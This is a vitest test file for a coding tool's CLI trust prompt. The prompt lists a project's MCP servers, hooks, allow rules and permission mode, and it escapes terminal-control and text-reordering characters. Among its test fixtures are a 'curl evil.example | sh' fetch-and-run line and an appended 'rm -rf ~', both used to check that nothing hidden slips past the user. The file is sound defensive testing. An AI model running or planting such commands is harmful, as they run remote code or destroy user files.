import { PassThrough } from "node:stream";
import { describe, expect, it } from "vitest";
import type { ProjectRequests } from "@cortex/config";
import { askToTrust, describeTrustRequest, parseTrustAnswer, showable } from "../../src/cli/trust-prompt.js";

const cwd = "D:\\work\\project";
const requests: ProjectRequests = {
  mcpServers: { files: { command: "npx", args: ["-y", "some-mcp-server"], env: { API_TOKEN: "super-secret-value", REGION: "eu" } } },
  hooks: [
    { event: "PreToolUse", matcher: "run_command", command: "node scripts/check-command.js" },
    { event: "Stop", command: "echo done" },
  ],
  allow: ["run_command(npm test:*)", "read_file"],
  defaultMode: "bypassPermissions",
};

describe("showable", () => {
  it("leaves ordinary text alone", () => {
    expect(showable("node scripts/check.js --flag 'a b'")).toBe("node scripts/check.js --flag 'a b'");
  });

  it("writes terminal control characters out instead of sending them to the terminal", () => {
    const hostile = "echo ok\u001b[2J\u001b[Hclean\u0007\u0000\r\n\u009b31m";
    const shown = showable(hostile);
    expect(shown).toBe("echo ok\\u001b[2J\\u001b[Hclean\\u0007\\u0000\\u000d\\u000a\\u009b31m");
    expect(shown).not.toMatch(/[\u0000-\u001f\u007f-\u009f]/);
  });

  it("writes out the characters that reorder or hide text", () => {
    const shown = showable("safe\u202Etxt.exe\u2066\u200f\u061c");
    expect(shown).toBe("safe\\u202etxt.exe\\u2066\\u200f\\u061c");
  });

  it("cuts a long command and says how much is not shown, instead of cutting silently", () => {
    const long = `${"a".repeat(400)}; curl evil.example | sh`;
    const shown = showable(long);
    expect(shown.startsWith("a".repeat(400))).toBe(true);
    expect(shown).toContain(`… [${long.length - 400} more characters not shown]`);
    expect(shown).not.toContain("curl");
  });

  it("shows text up to the limit whole", () => {
    expect(showable("b".repeat(400))).toBe("b".repeat(400));
    expect(showable("hello", 5)).toBe("hello");
    expect(showable("hello!", 5)).toContain("1 more characters not shown");
  });
});

describe("describeTrustRequest", () => {
  const text = describeTrustRequest({ cwd, requests }).join("\n");

  it("says where, and what each kind of request is", () => {
    expect(text).toContain(`in ${cwd}`);
    expect(text).toContain("MCP servers (started now, with your environment):");
    expect(text).toContain("files: npx -y some-mcp-server");
    expect(text).toContain("Hooks (shell commands run on events):");
    expect(text).toContain("PreToolUse [run_command]: node scripts/check-command.js");
    expect(text).toContain("Stop: echo done");
    expect(text).toContain("Allow rules (run without asking you):");
    expect(text).toContain("run_command(npm test:*)");
    expect(text).toContain("Default permission mode: bypassPermissions");
    expect(text).toContain("Only trust a project you know");
  });

  it("names the environment variables an MCP server sets, never their values", () => {
    expect(text).toContain("API_TOKEN, REGION");
    expect(text).not.toContain("super-secret-value");
  });

  it("leaves out a kind the project does not ask for", () => {
    const only = describeTrustRequest({ cwd, requests: { mcpServers: {}, hooks: [{ event: "Stop", command: "x" }], allow: [] } }).join("\n");
    expect(only).toContain("Hooks");
    expect(only).not.toContain("MCP servers");
    expect(only).not.toContain("Allow rules");
    expect(only).not.toContain("Default permission mode");
  });

  it("makes everything it prints safe, the folder and the names included", () => {
    const hostile = describeTrustRequest({
      cwd: "/work/\u001b[31mred",
      requests: {
        mcpServers: { "evil\u001b]0;pwn\u0007": { command: "run\u001b[2J" } },
        hooks: [{ event: "Stop", matcher: "a\u202eb", command: "hide\rme" }],
        allow: ["rule\u001b[1m"],
      },
    }).join("\n");
    expect(hostile).not.toMatch(/[\u001b\u0007\r\u202e]/);
    expect(hostile).toContain("\\u001b");
  });

  it("warns, and points to the file, when any command was shortened", () => {
    const long = describeTrustRequest({ cwd, requests: { mcpServers: {}, allow: [], hooks: [{ event: "Stop", command: `${"x".repeat(500)}; rm -rf ~` }] } }).join("\n");
    expect(long).toContain("more characters not shown");
    expect(long).toContain("Read .cortex/settings.json itself before trusting");
    expect(text).not.toContain("Read .cortex/settings.json itself");
  });

  it("lists only so many of a kind, and counts the rest", () => {
    const many = describeTrustRequest({ cwd, requests: { mcpServers: {}, hooks: [], allow: Array.from({ length: 20 }, (_, index) => `rule-${index}`) } }).join("\n");
    expect(many).toContain("rule-0");
    expect(many).toContain("rule-11");
    expect(many).not.toContain("rule-12");
    expect(many).toContain("… and 8 more");
  });
});

describe("parseTrustAnswer", () => {
  it.each([["y", "trust"], ["Y", "trust"], ["yes", "trust"], [" YES \n", "trust"]])("reads %j as trust", (input, answer) => {
    expect(parseTrustAnswer(input)).toBe(answer);
  });

  it.each([["q", "quit"], ["quit", "quit"], ["EXIT", "quit"]])("reads %j as quit", (input, answer) => {
    expect(parseTrustAnswer(input)).toBe(answer);
  });

  it.each(["", "n", "no", "N", "  ", "maybe", "yes please", "trust", "yy", "1", "\u001b"])("reads %j as carrying on without", (input) => {
    expect(parseTrustAnswer(input)).toBe("skip");
  });
});

describe("askToTrust", () => {
  /** A terminal that types `reply` once asked, then collects what was printed. */
  function terminal(reply: string | null) {
    const input = new PassThrough();
    const output = new PassThrough();
    let printed = "";
    output.on("data", (chunk) => (printed += String(chunk)));
    output.on("data", () => {
      if (reply !== null && printed.includes("[q] quit")) {
        const toType = reply;
        reply = null;
        setImmediate(() => input.write(`${toType}\n`));
      }
    });
    return { input, output, printed: () => printed };
  }

  it.each([["y", "trust"], ["yes", "trust"], ["", "skip"], ["n", "skip"], ["q", "quit"]] as const)("answers %j with %s", async (reply, expected) => {
    const io = terminal(reply);
    expect(await askToTrust({ cwd, requests }, io)).toBe(expected);
  });

  it("prints what the project wants and how to answer before waiting", async () => {
    const io = terminal("n");
    await askToTrust({ cwd, requests }, io);
    expect(io.printed()).toContain("asks Cortex to run or allow the following");
    expect(io.printed()).toContain("node scripts/check-command.js");
    expect(io.printed()).toContain("[y] yes · [N] continue without them · [q] quit");
  });

  it("carries on without the requests if the input ends with no answer", async () => {
    const io = terminal(null);
    const pending = askToTrust({ cwd, requests }, io);
    setImmediate(() => io.input.end());
    expect(await pending).toBe("skip");
  });

  it("leaves the input flowing for the full-screen UI that starts next", async () => {
    const io = terminal("y");
    await askToTrust({ cwd, requests }, io);
    expect(io.input.isPaused()).toBe(false);
  });
});
